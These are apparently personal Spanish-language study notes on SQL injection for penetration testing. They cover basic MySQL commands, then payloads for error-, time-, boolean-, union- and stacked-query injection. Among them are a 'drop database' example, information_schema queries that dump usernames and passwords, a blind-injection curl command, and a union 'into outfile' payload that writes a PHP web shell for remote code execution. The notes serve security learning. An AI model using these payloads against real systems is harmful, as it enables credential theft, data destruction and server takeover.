#Inyeccion
**PortSwigger Cheat-Sheet** ->  https://portswigger.net/web-security/sql-injection/cheat-sheet
# Sintaxis basica de SQL: 

![Screenshot](../../../Images/sqli4.png)

Supongamos que tenemos las siguientes DB

`SHOW DATABASES;` -> Muestra las bases de datos disponibles

![Screenshot](../../../Images/sqli1.png)

---------------------
Podemos utilizar el siguiente comando para meternos dentro de determinada DB

`USE mysql;` -> Es como que nos _metemos_ dentro de la db mysql.
`SHOW TABLES;` -> Enlista las _tablas_ de la DB.

![Screenshot](../../../Images/sqli2.png)

---------
`DESCRIBE user;` -> Muestra los **registros** de la tabla _user_ (a continuacion algunas columnas de la tabla user)

![Screenshot](../../../Images/sqli3.png)

------------------
`SELECT user,password FROM user;` -> Muestra el contenido de los registros user y password
En este caso no listamos ninguna Password

![Screenshot](../../../Images/sqli7.png)

Asi aplicamos filtros sobre la busqueda:

`SELECT user,password FROM user WHERE user = 'root'`

![Screenshot](../../../Images/sqli8.png)

-----------
# Creacion y modificacion de una DB

Con el siguiente comando _creamos una base de datos_:

```sql
CREATE DATABASE Vaultrack;
```


Con el siguiente comando _creamos una tabla_ llamada **usuarios** dentro de la DB:

```sql
CREATE TABLE usuarios (id int AUTO_INCREMENT PRIMARY KEY, username TEXT, password TEXT);
```

Dicha tabla se ve asi ahora mismo:

![Screenshot](../../../Images/sqli9.png)

Esta tabla tiene las columnas _id_, _username_, _password_.


Con el siguiente comando _insertamos_ registros dentro de las columnas de la tabla:

```sql
INSERT INTO usuarios(username,password) VALUES ('ffidel','Fidel123'),('admin','admin123'),('privilegiado','privilegiado123'); 
```

No insertamos nada dentro de la columna _id_ ya que es una columna que auto incrementa.

-------------
## Tipos de Inyecciones

### Error Based o Basada en Errores 
#### Este tipo de inyección SQL aprovecha **errores en el código SQL** para obtener información. Por ejemplo, si una consulta devuelve un error con un mensaje específico, se puede utilizar ese mensaje para obtener información adicional del sistema. --> _1' AND (SELECT @@version)-- -_

### Time Based o Basada en Tiempo
#### Este tipo de inyección SQL utiliza una consulta que **tarda mucho tiempo en ejecutarse** para obtener información. Por ejemplo, si se utiliza una consulta que realiza una búsqueda en una tabla y se añade un retardo en la consulta, se puede utilizar ese retardo para obtener información adicional         --> _' and sleep(5)-- -_

### Boolean Based o Basada en Booleanos 
#### Este tipo de inyección SQL utiliza consultas con **expresiones booleanas** para obtener información adicional. Por ejemplo, se puede utilizar una consulta con una expresión booleana para determinar si un usuario existe en una base de datos. --> _' OR 1=1-- -_

### Union Based o Basada en Uniones
#### Este tipo de inyección SQL utiliza la cláusula “**UNION**” para combinar dos o más consultas en una sola. Por ejemplo, si se utiliza una consulta que devuelve información sobre los usuarios y se agrega una cláusula “**UNION**” con otra consulta que devuelve información sobre los permisos, se puede obtener información adicional sobre los permisos de los usuarios. --> _' UNION SELECT 1,2,3-- -_

### Staqued Queries Based
#### Este tipo de inyección SQL aprovecha la posibilidad de **ejecutar múltiples consultas** en una sola sentencia para obtener información adicional. Por ejemplo, se puede utilizar una consulta que inserta un registro en una tabla y luego agregar una consulta adicional que devuelve información sobre la tabla. -- > _id=9; drop database();_

---------------
## Payloads 

https://tib3rius.com/sqli --> Muy buen recurso con muchos payloads para probar

Primero empezar viendo variaciones en la respuesta con **payloads simples**:
Ver variaciones en la respuesta, codigo HTML o errores SQL.

_'_
_"_
Luego de poner las comillas, si no pasa nada, probar con los siguientes payloads:
_1' order by 1-- -_
_' and sleep(5)-- -_ --> "Duerme" 5 segundos (puede ser _and_ u _or_) --> **Time Based SQLI**

Ir aumentando los numeritos del order by 

_admin'_
_admin"_

Probar tambien comentando, con _-- -_ o _#_ o _/*_.
Ir variando entre _'_ y _"_.
Probar adjuntando operadores _logicos_:

_admin" OR 1=1 -- -_
_admin" OR '1' = '1' -- -_
_admin' AND '1'='2_

Probar tambien los siguientes payloads:
_admin' UNION SELECT NULL,NULL,NULL-- -_

_admin' UNION SELECT group_concat(schema_name) from information_schema.schemata-- -_
_admin' UNION SELECT group_concat(schema_table) from information_schema.tables where table_schema='base_de_datos'-- -_
_admin' UNION SELECT group_concat(column_name) from information_schema.columns where table_schema='sqlitraining' and table_name='users'-- -_
_admin' UNION SELECT NULL,group_concat(username),group_concat(password),NULL.NULL,NULL from nombre_db.users-- -_

Con las siguientes inyecciones obtenemos informacion del sistema:

_UNION SELECT @@version_ -> _8.0.42-0ubuntu0.20.04.1_ ---> Version principal del motor (MySQL, MariaDB, Postgres, etc)
_UNION SELECT banner FROM v$version_ -> _Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production, PL/SQL Release 11.2.0.2.0 - Production, CORE 11.2.0.2.0 Production, TNS for Linux: Version 11.2.0.2.0 - Production, NLSRTL Version 11.2.0.2.0 - Production_ ---> Mas informacion del sistema

### Cuando es a ciegas cambia la cosa:
Cuando notamos cambios en el codigo de estado al probar payloads, se puede decir que es ciega, es decir, _no vemos la respuesta_. 

Si ejecutamos el siguiente comando, 

```bash
curl -s -I -X GET "https://google.com/index.php" -G --data-urlencode "id=9 or (select(select ascii(substring(username,1,1)) from users where id=1)=97)"
```

_-s_ -> Silent
_-I_ -> Muestra unicamente las cabeceras
_-X GET_-> Metodo a utilizar 

_Payload_:
- Toma el **primer carácter** del `username` del usuario con `id=1`.
- Lo convierte a **ASCII**.
- Compara si es **97** (la letra `'a'`).
- Si el primer carácter es `'a'` → la condición es **TRUE** → cambia la respuesta (status code o algún header).

---
Si es _Boolean Based_, programe alto script en 
`/home/ffidel/Escritorio/maquinas/IMF/content/sqli.py` 

---
### Posible RCE con SQLI
Si encontramos una _Union Based SQLI_, podemos tramitar la siguiente peticion:
```bash
google.com?id=1'union select 1,2,"<?php system($_GET['cmd']);?>",4,5 into outfile "/var/www/html/cmd.php"-- -
```

Eso te crea un archivo con parametro cmd en el directorio /cmd.php
Todo esto siempre y cuando la web _interprete_ php y este alojada en _/var/www/html_. 

---
### Formas de concatenacion

![Screenshot](../../../Images/sqli10.png)


